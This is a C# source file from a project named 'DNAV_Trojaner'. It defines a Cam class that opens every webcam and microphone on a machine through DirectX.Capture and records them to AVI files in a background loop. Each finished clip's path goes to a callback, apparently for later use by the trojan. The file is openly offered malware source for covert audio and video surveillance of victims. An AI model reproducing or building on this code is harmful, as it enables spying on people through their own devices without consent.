using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using DirectX.Capture;


namespace DNAV_Trojaner
{
    class Cam
    {
        //! benötigt http://directxcapture.wikidot.com/
        private string path = "default";
        private bool loop = true;
        private int time = 100;
        private Capture[] mainCaptures;
        static private int totalC = 0;
        static private int totalA = 0;
        static private Cam Main = new Cam();
        static private Thread t;

        static public void Start(){
            t = new Thread(
            new ThreadStart(Main.PStart));
            t.Start();
        }

        static public void Start(int interval){
            t = new Thread(
            new ThreadStart(Main.PStart));
            t.Start(interval);
        }

        static public void Start(int interval, Execution func){
            t = new Thread(
            new ThreadStart(Main.PStart));
            t = new Thread(() => Main.PStart(interval,func));
            t.Start();
        }
        static public void Stop(){
            Main.PStop();
        }

        static public void SetPath(string p){
            Main.path = p;
        }

        public delegate void Execution(string path);

        private void PStart(){
            mainCaptures = GetNewCapture();
            for(int c = 0 ; c < totalC; c++){
                mainCaptures[c].Start();
            }
        }
        private void PStart(int interval){
            PStart(interval, (path) => {});
        }
        private void PStart(int interval, Execution func){
            time = interval;
            mainCaptures = GetNewCapture();
            loop = true;
            int i = 1;
            while(loop){
                for(int c = 0 ; c < totalC; c++){
                    mainCaptures[c].Stop();
                    mainCaptures[c].Filename = path+c+""+i+".avi";
                    mainCaptures[c].Start();
                }
                    System.Threading.Thread.Sleep(time * 1000);
                for(int c = 0 ; c < totalC; c++){
                    mainCaptures[c].Stop();
                    func(path+ c +""+ i++ +".avi");

                }
            }
        }

        private void PStop(){
            for(int c = 0 ; c < totalC; c++){
                mainCaptures[c].Stop();
            }
            loop = false;
        }

        public Cam(string p) {
            path = p;
        }
        public Cam() {}

        private Capture[] GetNewCapture(){
            Filters filters= new Filters();
            totalC = filters.VideoInputDevices.Count;
            totalA = filters.AudioInputDevices.Count;
            Capture[] captures = new Capture[totalC];
            for(int c = 0 ; c < totalC; c++)
            {

                    captures[c] = new Capture( filters.VideoInputDevices[c], filters.AudioInputDevices[1]);   

                    captures[c].VideoCompressor = filters.VideoCompressors[0];
                    captures[c].AudioCompressor = filters.AudioCompressors[0];

                    // captures[c].FrameRate = 29.997;                 // NTSC
                    // capture.FrameSize = new Size( 640, 480 );   // 640x480
                    // capture.AudioSamplingRate = 44100;          // 44.1 kHz
                    // capture.AudioSampleSize = 16;               // 16-bit
                    // capture.AudioChannels = 1;                  // Mono

                    captures[c].Filename = path+c+".avi";
            }
            return captures;
        }
    }
}
